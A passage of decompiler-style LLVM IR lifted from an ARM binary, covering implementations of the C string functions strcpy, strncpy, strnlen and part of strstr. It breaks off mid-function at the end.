dec_label_pc_13f90:                               ; preds = %bb24, %dec_label_pc_13f88, %dec_label_pc_13f6c, %bb26, %dec_label_pc_13f3c
  store i32 %v6_13e98, i32* @r5, align 4
  store i32 %v9_13e98, i32* @r6, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v4_13ed0, { 1, 0 }
  uselistorder i32 %v2_13ed0, { 0, 2, 1 }
  uselistorder i32 %v0_13f34, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %v5_13ec4, { 1, 0 }
  uselistorder i32 %v1_13ebc, { 1, 0, 2, 3 }
  uselistorder i8* %.0, { 1, 0 }
  uselistorder i32 %v1_13e9c, { 2, 3, 4, 5, 6, 0, 1 }
  uselistorder i32 %v9_13e98, { 3, 0, 1, 2, 4 }
  uselistorder i32 %v6_13e98, { 3, 0, 1, 2, 4 }
  uselistorder label %dec_label_pc_13f90, { 1, 2, 3, 4, 0 }
  uselistorder label %dec_label_pc_13f18, { 1, 0 }
}

define i32 @strcpy(i32 %arg1, i8* %arg2) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg2 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %v2_13fa0 = sub i32 %arg1, %tmp
  %v1_13fa4 = add i32 %v2_13fa0, -1
  store i32 %v1_13fa4, i32* %r2.global-to-local, align 4
  %v2_13fa84 = load i8, i8* %arg2, align 1
  %v5_13fa86 = add i32 %tmp, 1
  store i32 %v5_13fa86, i32* %r1.global-to-local, align 4
  %v2_13fac7 = icmp eq i8 %v2_13fa84, 0
  store i1 %v2_13fac7, i1* %cpsr_z.global-to-local, align 1
  %v5_13fb08 = inttoptr i32 %arg1 to i8*
  store i8 %v2_13fa84, i8* %v5_13fb08, align 1
  %v0_13fb49 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_13fb49, label %dec_label_pc_13fb8, label %dec_label_pc_13fa8.dec_label_pc_13fa8_crit_edge

dec_label_pc_13fa8.dec_label_pc_13fa8_crit_edge:  ; preds = %entry, %dec_label_pc_13fa8.dec_label_pc_13fa8_crit_edge
  %v0_13fa8.pre = load i32, i32* %r1.global-to-local, align 4
  %v3_13fb0.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_13fa8 = inttoptr i32 %v0_13fa8.pre to i8*
  %v2_13fa8 = load i8, i8* %v1_13fa8, align 1
  %v5_13fa8 = add i32 %v0_13fa8.pre, 1
  store i32 %v5_13fa8, i32* %r1.global-to-local, align 4
  %v2_13fac = icmp eq i8 %v2_13fa8, 0
  store i1 %v2_13fac, i1* %cpsr_z.global-to-local, align 1
  %v4_13fb0 = add i32 %v5_13fa8, %v3_13fb0.pre
  %v5_13fb0 = inttoptr i32 %v4_13fb0 to i8*
  store i8 %v2_13fa8, i8* %v5_13fb0, align 1
  %v0_13fb4 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_13fb4, label %dec_label_pc_13fb8, label %dec_label_pc_13fa8.dec_label_pc_13fa8_crit_edge

dec_label_pc_13fb8:                               ; preds = %dec_label_pc_13fa8.dec_label_pc_13fa8_crit_edge, %entry
  ret i32 %arg1

; uselistorder directives
  uselistorder i32* %r1.global-to-local, { 3, 2, 1, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 2, 3, 0, 1 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_13fa8.dec_label_pc_13fa8_crit_edge, { 1, 0 }
}

define i32 @strncpy(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r2.global-to-local, align 4
  %v7_13fbc = icmp eq i32 %arg2, 3
  store i1 %v7_13fbc, i1* %cpsr_z.global-to-local, align 1
  %v1_13fc4 = add i32 %arg1, -1
  store i32 %v1_13fc4, i32* %ip.global-to-local, align 4
  %tmp = icmp ult i32 %arg2, 4
  br i1 %tmp, label %dec_label_pc_14040, label %dec_label_pc_13fcc

dec_label_pc_13fcc:                               ; preds = %entry
  %v3_13fcc = udiv i32 %arg2, 4
  store i32 %v3_13fcc, i32* @lr, align 4
  %v0_13fd0.pre = load i32, i32* @r1, align 4
  br label %dec_label_pc_13fd0

dec_label_pc_13fd0:                               ; preds = %dec_label_pc_1401c, %dec_label_pc_13fcc
  %v2_13fd8 = phi i32 [ %v6_14010, %dec_label_pc_1401c ], [ %v1_13fc4, %dec_label_pc_13fcc ]
  %v0_13fd0 = phi i32 [ %v1_14020, %dec_label_pc_1401c ], [ %v0_13fd0.pre, %dec_label_pc_13fcc ]
  %v1_13fd0 = inttoptr i32 %v0_13fd0 to i8*
  %v2_13fd0 = load i8, i8* %v1_13fd0, align 1
  %v3_13fd0 = zext i8 %v2_13fd0 to i32
  store i32 %v3_13fd0, i32* %r3.global-to-local, align 4
  %v2_13fd4 = icmp eq i8 %v2_13fd0, 0
  store i1 %v2_13fd4, i1* %cpsr_z.global-to-local, align 1
  %v3_13fd8 = add i32 %v2_13fd8, 1
  %v4_13fd8 = inttoptr i32 %v3_13fd8 to i8*
  store i8 %v2_13fd0, i8* %v4_13fd8, align 1
  %v5_13fd8 = load i32, i32* %ip.global-to-local, align 4
  %v6_13fd8 = add i32 %v5_13fd8, 1
  store i32 %v6_13fd8, i32* %ip.global-to-local, align 4
  %v0_13fdc = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_13fdc, label %dec_label_pc_1402c, label %dec_label_pc_13fe0

dec_label_pc_13fe0:                               ; preds = %dec_label_pc_13fd0
  %v0_13fe0 = load i32, i32* @r1, align 4
  %v1_13fe0 = add i32 %v0_13fe0, 1
  %v2_13fe0 = inttoptr i32 %v1_13fe0 to i8*
  %v3_13fe0 = load i8, i8* %v2_13fe0, align 1
  %v4_13fe0 = zext i8 %v3_13fe0 to i32
  store i32 %v4_13fe0, i32* %r3.global-to-local, align 4
  %v2_13fe4 = icmp eq i8 %v3_13fe0, 0
  store i1 %v2_13fe4, i1* %cpsr_z.global-to-local, align 1
  %v3_13fe8 = add i32 %v5_13fd8, 2
  %v4_13fe8 = inttoptr i32 %v3_13fe8 to i8*
  store i8 %v3_13fe0, i8* %v4_13fe8, align 1
  %v5_13fe8 = load i32, i32* %ip.global-to-local, align 4
  %v6_13fe8 = add i32 %v5_13fe8, 1
  store i32 %v6_13fe8, i32* %ip.global-to-local, align 4
  %v0_13fec = load i32, i32* @r1, align 4
  %v1_13fec = add i32 %v0_13fec, 1
  store i32 %v1_13fec, i32* %r1.global-to-local, align 4
  %v0_13ff0 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_13ff0, label %dec_label_pc_1402c, label %dec_label_pc_13ff4

dec_label_pc_13ff4:                               ; preds = %dec_label_pc_13fe0
  %v1_13ff4 = add i32 %v0_13fec, 2
  %v2_13ff4 = inttoptr i32 %v1_13ff4 to i8*
  %v3_13ff4 = load i8, i8* %v2_13ff4, align 1
  %v4_13ff4 = zext i8 %v3_13ff4 to i32
  store i32 %v4_13ff4, i32* %r3.global-to-local, align 4
  %v2_13ff8 = icmp eq i8 %v3_13ff4, 0
  store i1 %v2_13ff8, i1* %cpsr_z.global-to-local, align 1
  %v3_13ffc = add i32 %v5_13fe8, 2
  %v4_13ffc = inttoptr i32 %v3_13ffc to i8*
  store i8 %v3_13ff4, i8* %v4_13ffc, align 1
  %v5_13ffc = load i32, i32* %ip.global-to-local, align 4
  %v6_13ffc = add i32 %v5_13ffc, 1
  store i32 %v6_13ffc, i32* %ip.global-to-local, align 4
  %v0_14000 = load i32, i32* %r1.global-to-local, align 4
  %v1_14000 = add i32 %v0_14000, 1
  store i32 %v1_14000, i32* %r1.global-to-local, align 4
  %v0_14004 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_14004, label %dec_label_pc_1402c, label %dec_label_pc_14008

dec_label_pc_14008:                               ; preds = %dec_label_pc_13ff4
  %v1_14008 = add i32 %v0_14000, 2
  %v2_14008 = inttoptr i32 %v1_14008 to i8*
  %v3_14008 = load i8, i8* %v2_14008, align 1
  %v4_14008 = zext i8 %v3_14008 to i32
  store i32 %v4_14008, i32* %r3.global-to-local, align 4
  %v2_1400c = icmp eq i8 %v3_14008, 0
  store i1 %v2_1400c, i1* %cpsr_z.global-to-local, align 1
  %v3_14010 = add i32 %v5_13ffc, 2
  %v4_14010 = inttoptr i32 %v3_14010 to i8*
  store i8 %v3_14008, i8* %v4_14010, align 1
  %v5_14010 = load i32, i32* %ip.global-to-local, align 4
  %v6_14010 = add i32 %v5_14010, 1
  store i32 %v6_14010, i32* %ip.global-to-local, align 4
  %v0_14014 = load i32, i32* %r1.global-to-local, align 4
  %v1_14014 = add i32 %v0_14014, 1
  store i32 %v1_14014, i32* %r1.global-to-local, align 4
  %v0_14018 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_14018, label %dec_label_pc_1402c, label %dec_label_pc_1401c

dec_label_pc_1401c:                               ; preds = %dec_label_pc_14008
  %v0_1401c = load i32, i32* @lr, align 4
  %v1_1401c = add i32 %v0_1401c, -1
  store i32 %v1_1401c, i32* @lr, align 4
  %v7_1401c = icmp eq i32 %v0_1401c, 1
  store i1 %v7_1401c, i1* %cpsr_z.global-to-local, align 1
  %v1_14020 = add i32 %v0_14014, 2
  store i32 %v1_14020, i32* @r1, align 4
  br i1 %v7_1401c, label %dec_label_pc_14040, label %dec_label_pc_13fd0

dec_label_pc_1402c:                               ; preds = %dec_label_pc_14008, %dec_label_pc_13ff4, %dec_label_pc_13fe0, %dec_label_pc_13fd0
  %v1_1402c = phi i32 [ %v6_14010, %dec_label_pc_14008 ], [ %v6_13ffc, %dec_label_pc_13ff4 ], [ %v6_13fe8, %dec_label_pc_13fe0 ], [ %v6_13fd8, %dec_label_pc_13fd0 ]
  %v2_1402c1 = sub i32 %arg1, %v1_1402c
  %v2_14030 = add i32 %v2_1402c1, %arg2
  store i32 %v2_14030, i32* %r3.global-to-local, align 4
  %v1_14034 = add i32 %v2_14030, -1
  store i32 %v1_14034, i32* %r2.global-to-local, align 4
  %v7_14034 = icmp eq i32 %v2_14030, 1
  store i1 %v7_14034, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_14034, label %bb, label %dec_label_pc_14060

bb:                                               ; preds = %dec_label_pc_1402c
  ret i32 %arg1

dec_label_pc_14040:                               ; preds = %dec_label_pc_1401c, %entry
  %v2_140506 = phi i32 [ %v1_13fc4, %entry ], [ %v6_14010, %dec_label_pc_1401c ]
  %v1_14040 = urem i32 %arg2, 4
  store i32 %v1_14040, i32* %r2.global-to-local, align 4
  %v2_14040 = icmp eq i32 %v1_14040, 0
  store i1 %v2_14040, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_14040, label %bb11, label %.preheader

bb11:                                             ; preds = %dec_label_pc_14040
  ret i32 %arg1

.preheader:                                       ; preds = %dec_label_pc_14040, %._crit_edge
  %v2_14050 = phi i32 [ %v6_14050, %._crit_edge ], [ %v2_140506, %dec_label_pc_14040 ]
  %v0_1404c = phi i32 [ %v0_1404c.pre, %._crit_edge ], [ %v1_14040, %dec_label_pc_14040 ]
  %v0_14048 = load i32, i32* @r1, align 4
  %v1_14048 = inttoptr i32 %v0_14048 to i8*
  %v2_14048 = load i8, i8* %v1_14048, align 1
  %v3_14048 = zext i8 %v2_14048 to i32
  store i32 %v3_14048, i32* %r3.global-to-local, align 4
  %v5_14048 = add i32 %v0_14048, 1
  store i32 %v5_14048, i32* @r1, align 4
  %v1_1404c = add i32 %v0_1404c, -1
  store i32 %v1_1404c, i32* %r2.global-to-local, align 4
  %v7_1404c = icmp eq i32 %v0_1404c, 1
  store i1 %v7_1404c, i1* %cpsr_z.global-to-local, align 1
  %v3_14050 = add i32 %v2_14050, 1
  %v4_14050 = inttoptr i32 %v3_14050 to i8*
  store i8 %v2_14048, i8* %v4_14050, align 1
  %v5_14050 = load i32, i32* %ip.global-to-local, align 4
  %v6_14050 = add i32 %v5_14050, 1
  store i32 %v6_14050, i32* %ip.global-to-local, align 4
  %v0_14054 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_14054, label %bb12, label %bb13

bb12:                                             ; preds = %.preheader
  ret i32 %arg1

bb13:                                             ; preds = %.preheader
  %v0_14058 = load i32, i32* %r3.global-to-local, align 4
  %v2_14058 = icmp eq i32 %v0_14058, 0
  store i1 %v2_14058, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_14058, label %dec_label_pc_14060, label %._crit_edge

._crit_edge:                                      ; preds = %bb13
  %v0_1404c.pre = load i32, i32* %r2.global-to-local, align 4
  br label %.preheader

dec_label_pc_14060:                               ; preds = %dec_label_pc_1402c, %bb13, %dec_label_pc_14060
  %v2_14068 = phi i32 [ %v6_14068, %dec_label_pc_14060 ], [ %v1_1402c, %dec_label_pc_1402c ], [ %v6_14050, %bb13 ]
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_14064 = load i32, i32* %r2.global-to-local, align 4
  %v1_14064 = add i32 %v0_14064, -1
  store i32 %v1_14064, i32* %r2.global-to-local, align 4
  %v7_14064 = icmp eq i32 %v0_14064, 1
  store i1 %v7_14064, i1* %cpsr_z.global-to-local, align 1
  %v3_14068 = add i32 %v2_14068, 1
  %v4_14068 = inttoptr i32 %v3_14068 to i8*
  store i8 0, i8* %v4_14068, align 1
  %v5_14068 = load i32, i32* %ip.global-to-local, align 4
  %v6_14068 = add i32 %v5_14068, 1
  store i32 %v6_14068, i32* %ip.global-to-local, align 4
  %v0_1406c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1406c, label %dec_label_pc_14070, label %dec_label_pc_14060

dec_label_pc_14070:                               ; preds = %dec_label_pc_14060
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 %v6_14068, { 1, 0 }
  uselistorder i32 %v0_14064, { 1, 0 }
  uselistorder i32 %v6_14050, { 0, 2, 1 }
  uselistorder i32 %v1_14040, { 2, 1, 0 }
  uselistorder i32 %v2_14030, { 2, 1, 0 }
  uselistorder i32 %v1_14020, { 1, 0 }
  uselistorder i32 %v0_1401c, { 1, 0 }
  uselistorder i32 %v6_14010, { 0, 1, 3, 2 }
  uselistorder i32* %r2.global-to-local, { 1, 5, 2, 3, 4, 6, 0 }
  uselistorder i32* %ip.global-to-local, { 0, 7, 1, 10, 2, 3, 4, 5, 6, 8, 9, 11, 12 }
  uselistorder i32 %arg2, { 1, 3, 2, 0, 4, 5 }
  uselistorder i32 %arg1, { 1, 2, 3, 5, 0, 4 }
  uselistorder label %dec_label_pc_14060, { 2, 1, 0 }
  uselistorder label %.preheader, { 1, 0 }
}

define i32 @strnlen(i8* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %v0_14074 = load i32, i32* @r1, align 4
  %v2_14074 = icmp eq i32 %v0_14074, 0
  br i1 %v2_14074, label %bb, label %dec_label_pc_140a4

bb:                                               ; preds = %entry
  ret i32 0

dec_label_pc_1408c:                               ; preds = %dec_label_pc_140b4
  %v3_1408c = icmp uge i32 %v5_14140, %v1_1408c
  %v9_1408c = icmp eq i32 %v5_14140, %v1_1408c
  %v2_14090 = xor i1 %v3_1408c, true
  %v3_14090 = or i1 %v9_1408c, %v2_14090
  br i1 %v3_14090, label %bb19, label %bb20

bb19:                                             ; preds = %dec_label_pc_1408c
  %v6_14090 = sub i32 %v5_14140, %tmp
  br label %bb20

bb20:                                             ; preds = %dec_label_pc_1408c, %bb19
  %v5_14094 = phi i32 [ %v1_1408c, %dec_label_pc_1408c ], [ %v6_14090, %bb19 ]
  %v2_14094 = xor i1 %v9_1408c, true
  %v3_14094 = and i1 %v3_1408c, %v2_14094
  br i1 %v3_14094, label %bb21, label %bb22

bb21:                                             ; preds = %bb20
  %v6_14094 = sub i32 %v5_14094, %tmp
  br label %bb22

bb22:                                             ; preds = %bb20, %bb21
  %v8_14098 = phi i32 [ %v5_14094, %bb20 ], [ %v6_14094, %bb21 ]
  ret i32 %v8_14098

dec_label_pc_1409c:                               ; preds = %dec_label_pc_140e8
  br label %dec_label_pc_1413c

dec_label_pc_140a4:                               ; preds = %entry
  %v2_140a4 = add i32 %tmp, %v0_14074
  %v3_140a4 = icmp ult i32 %v2_140a4, %tmp
  br i1 %v3_140a4, label %bb23, label %bb24

bb23:                                             ; preds = %dec_label_pc_140a4
  br label %bb24

bb24:                                             ; preds = %dec_label_pc_140a4, %bb23
  %v5_14140 = phi i32 [ %v2_140a4, %dec_label_pc_140a4 ], [ -1, %bb23 ]
  %v1_140c42 = urem i32 %tmp, 4
  %v2_140c43 = icmp eq i32 %v1_140c42, 0
  br i1 %v2_140c43, label %dec_label_pc_140cc, label %dec_label_pc_140b4

dec_label_pc_140b4:                               ; preds = %bb24, %dec_label_pc_140c0
  %v1_1408c = phi i32 [ %v1_140c0, %dec_label_pc_140c0 ], [ %tmp, %bb24 ]
  %v1_140b4 = inttoptr i32 %v1_1408c to i8*
  %v2_140b4 = load i8, i8* %v1_140b4, align 1
  %v2_140b8 = icmp eq i8 %v2_140b4, 0
  br i1 %v2_140b8, label %dec_label_pc_1408c, label %dec_label_pc_140c0

dec_label_pc_140c0:                               ; preds = %dec_label_pc_140b4
  %v1_140c0 = add i32 %v1_1408c, 1
  %v1_140c4 = urem i32 %v1_140c0, 4
  %v2_140c4 = icmp eq i32 %v1_140c4, 0
  br i1 %v2_140c4, label %dec_label_pc_140cc, label %dec_label_pc_140b4

dec_label_pc_140cc:                               ; preds = %dec_label_pc_140c0, %bb24
  %storemerge.lcssa = phi i32 [ %tmp, %bb24 ], [ %v1_140c0, %dec_label_pc_140c0 ]
  store i32 %storemerge.lcssa, i32* @lr, align 4
  %v3_1412c32 = icmp ult i32 %storemerge.lcssa, %v5_14140
  br i1 %v3_1412c32, label %dec_label_pc_140d4, label %dec_label_pc_1413c

dec_label_pc_140d4:                               ; preds = %dec_label_pc_14128, %dec_label_pc_140cc
  %v0_1409c39 = phi i32 [ %v4_140d4, %dec_label_pc_14128 ], [ %storemerge.lcssa, %dec_label_pc_140cc ]
  %v1_140d4 = inttoptr i32 %v0_1409c39 to i32*
  %v2_140d4 = load i32, i32* %v1_140d4, align 4
  %v4_140d4 = add i32 %v0_1409c39, 4
  store i32 %v4_140d4, i32* @lr, align 4
  %v2_140d8 = add i32 %v2_140d4, -16843009
  %v2_140dc = and i32 %v2_140d8, -2139062144
  %v2_140e0 = icmp eq i32 %v2_140dc, 0
  br i1 %v2_140e0, label %dec_label_pc_14128, label %dec_label_pc_140e8

dec_label_pc_140e8:                               ; preds = %dec_label_pc_140d4
  %v2_140e8 = inttoptr i32 %v0_1409c39 to i8*
  %v3_140e8 = load i8, i8* %v2_140e8, align 1
  %v2_140f0 = icmp eq i8 %v3_140e8, 0
  %v1_140f4 = add i32 %v0_1409c39, 1
  br i1 %v2_140f0, label %dec_label_pc_1409c, label %dec_label_pc_140fc

dec_label_pc_140fc:                               ; preds = %dec_label_pc_140e8
  %v2_140fc = inttoptr i32 %v1_140f4 to i8*
  %v3_140fc = load i8, i8* %v2_140fc, align 1
  %v2_14100 = icmp eq i8 %v3_140fc, 0
  br i1 %v2_14100, label %dec_label_pc_1413c, label %dec_label_pc_14108

dec_label_pc_14108:                               ; preds = %dec_label_pc_140fc
  %v1_14108 = add i32 %v0_1409c39, 2
  %v2_14108 = inttoptr i32 %v1_14108 to i8*
  %v3_14108 = load i8, i8* %v2_14108, align 1
  %v2_1410c = icmp eq i8 %v3_14108, 0
  br i1 %v2_1410c, label %dec_label_pc_1413c, label %dec_label_pc_14118

dec_label_pc_14118:                               ; preds = %dec_label_pc_14108
  %v1_14118 = add i32 %v0_1409c39, 3
  %v2_14118 = inttoptr i32 %v1_14118 to i8*
  %v3_14118 = load i8, i8* %v2_14118, align 1
  %v2_1411c = icmp eq i8 %v3_14118, 0
  br i1 %v2_1411c, label %dec_label_pc_1413c, label %dec_label_pc_14128

dec_label_pc_14128:                               ; preds = %dec_label_pc_14118, %dec_label_pc_140d4
  %v3_1412c = icmp ult i32 %v4_140d4, %v5_14140
  br i1 %v3_1412c, label %dec_label_pc_140d4, label %dec_label_pc_1413c

dec_label_pc_1413c:                               ; preds = %dec_label_pc_14128, %dec_label_pc_140cc, %dec_label_pc_140fc, %dec_label_pc_14108, %dec_label_pc_14118, %dec_label_pc_1409c
  %v1_1413c = phi i32 [ %v0_1409c39, %dec_label_pc_1409c ], [ %storemerge.lcssa, %dec_label_pc_140cc ], [ %v1_140f4, %dec_label_pc_140fc ], [ %v1_14108, %dec_label_pc_14108 ], [ %v1_14118, %dec_label_pc_14118 ], [ %v5_14140, %dec_label_pc_14128 ]
  %v3_1413c = icmp uge i32 %v5_14140, %v1_1413c
  %v9_1413c = icmp eq i32 %v5_14140, %v1_1413c
  %v2_14140 = xor i1 %v3_1413c, true
  %v3_14140 = or i1 %v9_1413c, %v2_14140
  br i1 %v3_14140, label %bb25, label %bb26

bb25:                                             ; preds = %dec_label_pc_1413c
  %v6_14140 = sub i32 %v5_14140, %tmp
  br label %bb26

bb26:                                             ; preds = %dec_label_pc_1413c, %bb25
  %v5_14144 = phi i32 [ %v1_1413c, %dec_label_pc_1413c ], [ %v6_14140, %bb25 ]
  %v2_14144 = xor i1 %v9_1413c, true
  %v3_14144 = and i1 %v3_1413c, %v2_14144
  br i1 %v3_14144, label %bb27, label %bb28

bb27:                                             ; preds = %bb26
  %v6_14144 = sub i32 %v5_14144, %tmp
  br label %bb28

bb28:                                             ; preds = %bb26, %bb27
  %v8_14148 = phi i32 [ %v5_14144, %bb26 ], [ %v6_14144, %bb27 ]
  ret i32 %v8_14148

; uselistorder directives
  uselistorder i1 %v3_1413c, { 1, 0 }
  uselistorder i32 %v4_140d4, { 1, 2, 0 }
  uselistorder i32 %v0_1409c39, { 0, 6, 5, 4, 3, 1, 2 }
  uselistorder i32 %v1_140c0, { 1, 0, 2 }
  uselistorder i32 %v1_1408c, { 3, 4, 2, 1, 0 }
  uselistorder i32 %v5_14140, { 3, 4, 5, 0, 2, 1, 8, 7, 6 }
  uselistorder i1 %v3_1408c, { 1, 0 }
  uselistorder i32 %tmp, { 4, 3, 5, 7, 8, 0, 6, 2, 1 }
  uselistorder label %bb28, { 1, 0 }
  uselistorder label %bb26, { 1, 0 }
  uselistorder label %dec_label_pc_1413c, { 0, 4, 3, 2, 1, 5 }
  uselistorder label %dec_label_pc_140b4, { 1, 0 }
  uselistorder label %bb24, { 1, 0 }
  uselistorder label %bb22, { 1, 0 }
  uselistorder label %bb20, { 1, 0 }
}

define i32 @strstr(i32 %arg1, i8* %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg2 to i32
  %v6_14154 = load i32, i32* @r5, align 4
  %v9_14154 = load i32, i32* @r6, align 4
  %v3_14158 = load i8, i8* %arg2, align 1
  %v2_1415c = icmp eq i8 %v3_14158, 0
  br i1 %v2_1415c, label %bb, label %bb50

bb:                                               ; preds = %entry
  ret i32 %arg1

bb50:                                             ; preds = %entry
  %v1_14164 = add i32 %arg1, -1
  br label %dec_label_pc_14168

dec_label_pc_14168:                               ; preds = %dec_label_pc_14174, %bb50
  %v0_14168 = phi i32 [ %v1_14168, %dec_label_pc_14174 ], [ %v1_14164, %bb50 ]
  %v1_14168 = add i32 %v0_14168, 1
  %v2_14168 = inttoptr i32 %v1_14168 to i8*
  %v3_14168 = load i8, i8* %v2_14168, align 1
  %v2_1416c = icmp eq i8 %v3_14168, 0
  br i1 %v2_1416c, label %dec_label_pc_14244, label %dec_label_pc_14174

dec_label_pc_14174:                               ; preds = %dec_label_pc_14168
  %v9_14174 = icmp eq i8 %v3_14168, %v3_14158
  br i1 %v9_14174, label %dec_label_pc_1417c, label %dec_label_pc_14168

dec_label_pc_1417c:                               ; preds = %dec_label_pc_14174
  %v2_1417c = add i32 %tmp, 1
  %v3_1417c = inttoptr i32 %v2_1417c to i8*
  %v4_1417c = load i8, i8* %v3_1417c, align 1
  %v2_14180 = icmp eq i8 %v4_1417c, 0
  br i1 %v2_14180, label %bb51, label %bb52

bb51:                                             ; preds = %dec_label_pc_1417c
  store i32 %v6_14154, i32* @r5, align 4
  store i32 %v9_14154, i32* @r6, align 4
  ret i32 %v1_14168

bb52:                                             ; preds = %dec_label_pc_1417c
  %v1_1418c = add i32 %v0_14168, 2
  %v1_141e0 = add i32 %tmp, 2
  %v2_141e0 = inttoptr i32 %v1_141e0 to i8*
  br label %dec_label_pc_141d8

dec_label_pc_1419c:                               ; preds = %dec_label_pc_14238
  %v3_1419c = load i8, i8* %v3_141d0.pn.in, align 1
  store i32 %storemerge43, i32* @ip, align 4
  br label %dec_label_pc_141c8.preheader

dec_label_pc_141c8.preheader:                     ; preds = %dec_label_pc_1419c, %dec_label_pc_141d8
  %v0_141c84.in = phi i8 [ %v3_1419c, %dec_label_pc_1419c ], [ %v3_141d0.pn, %dec_label_pc_141d8 ]
  %v9_141c813 = icmp eq i8 %v0_141c84.in, %v3_14158
  br i1 %v9_141c813, label %dec_label_pc_141d0, label %dec_label_pc_141a8

dec_label_pc_141a8:                               ; preds = %dec_label_pc_141c8.preheader, %dec_label_pc_141c4
  %v0_141b0 = phi i32 [ %v1_141c4, %dec_label_pc_141c4 ], [ %storemerge43, %dec_label_pc_141c8.preheader ]
  %v0_141a8.in = phi i8 [ %v3_141c4, %dec_label_pc_141c4 ], [ %v0_141c84.in, %dec_label_pc_141c8.preheader ]
  %v2_141a8 = icmp eq i8 %v0_141a8.in, 0
  br i1 %v2_141a8, label %dec_label_pc_14244, label %dec_label_pc_141b0

dec_label_pc_141b0:                               ; preds = %dec_label_pc_141a8
  %v1_141b0 = add i32 %v0_141b0, 1
  %v2_141b0 = inttoptr i32 %v1_141b0 to i8*
  %v3_141b0 = load i8, i8* %v2_141b0, align 1
  store i32 %v1_141b0, i32* @ip, align 4
  %v9_141b4 = icmp eq i8 %v3_141b0, %v3_14158
  br i1 %v9_141b4, label %dec_label_pc_141d0, label %dec_label_pc_141bc

dec_label_pc_141bc:                               ; preds = %dec_label_pc_141b0
  %v2_141bc = icmp eq i8 %v3_141b0, 0
  br i1 %v2_141bc, label %dec_label_pc_14244, label %dec_label_pc_141c4

dec_label_pc_141c4:                               ; preds = %dec_label_pc_141bc
  %v1_141c4 = add i32 %v0_141b0, 2
  %v2_141c4 = inttoptr i32 %v1_141c4 to i8*
  %v3_141c4 = load i8, i8* %v2_141c4, align 1
  store i32 %v1_141c4, i32* @ip, align 4
  %v9_141c8 = icmp eq i8 %v3_141c4, %v3_14158
  br i1 %v9_141c8, label %dec_label_pc_141d0, label %dec_label_pc_141a8

dec_label_pc_141d0:                               ; preds = %dec_label_pc_141b0, %dec_label_pc_141c4, %dec_label_pc_141c8.preheader
  %v0_141d0 = phi i32 [ %storemerge43, %dec_label_pc_141c8.preheader ], [ %v1_141b0, %dec_label_pc_141b0 ], [ %v1_141c4, %dec_label_pc_141c4 ]
  %v1_141d0 = add i32 %v0_141d0, 1
  br label %dec_label_pc_141d8

dec_label_pc_141d8:                               ; preds = %bb52, %dec_label_pc_141d0
  %storemerge43 = phi i32 [ %v1_141d0, %dec_label_pc_141d0 ], [ %v1_1418c, %bb52 ]
  %v3_141d0.pn.in = inttoptr i32 %storemerge43 to i8*
  %v3_141d0.pn = load i8, i8* %v3_141d0.pn.in, align 1
  store i32 %storemerge43, i32* @ip, align 4
  %storemerge = icmp eq i8 %v3_141d0.pn, %v4_1417c
  br i1 %storemerge, label %dec_label_pc_141dc, label %dec_label_pc_141c8.preheader

dec_label_pc_141dc:                               ; preds = %dec_label_pc_141d8
  %v1_141dc = add i32 %storemerge43, 1
  %v2_141dc = inttoptr i32 %v1_141dc to i8*
  %v3_141dc = load i8, i8* %v2_141dc, align 1
  %v4_141dc = zext i8 %v3_141dc to i32
  %v3_141e0 = load i8, i8* %v2_141e0, align 1
  %v4_141e0 = zext i8 %v3_141e0 to i32
  %v1_141e4 = add i32 %storemerge43, -1
  %v9_141e8 = icmp eq i8 %v3_141dc, %v3_141e0
  store i32 %v1_141e0, i32* @lr, align 4
  store i32 %v1_141dc, i32* @ip, align 4
  br i1 %v9_141e8, label %dec_label_pc_141f8, label %dec_label_pc_14238

dec_label_pc_141f8:                               ; preds = %dec_label_pc_141dc, %dec_label_pc_141f4
  %v0_14210 = phi i32 [ %v1_14218, %dec_label_pc_141f4 ], [ %v1_141e0, %dec_label_pc_141dc ]
  %v0_14208 = phi i32 [ %v1_14214, %dec_label_pc_141f4 ], [ %v1_141dc, %dec_label_pc_141dc ]
  %v0_141f8 = phi i32 [ %v4_14228, %dec_label_pc_141f4 ], [ %v4_141dc, %dec_label_pc_141dc ]
  %v2_141f8 = icmp eq i32 %v0_141f8, 0
  br i1 %v2_141f8, label %bb53, label %bb54

bb53:                                             ; preds = %dec_label_pc_141f8
  store i32 %v6_14154, i32* @r5, align 4
  store i32 %v9_14154, i32* @r6, align 4
  ret i32 %v1_141e4

bb54:                                             ; preds = %dec_label_pc_141f8
  %v1_14200 = add i32 %v0_14208, 1
  %v2_14200 = inttoptr i32 %v1_14200 to i8*
  %v3_14200 = load i8, i8* %v2_14200, align 1
  %v1_14204 = add i32 %v0_14210, 1
  %v2_14204 = inttoptr i32 %v1_14204 to i8*
  %v3_14204 = load i8, i8* %v2_14204, align 1
  %v4_14204 = zext i8 %v3_14204 to i32
  %v9_1420c = icmp eq i8 %v3_14200, %v3_14204
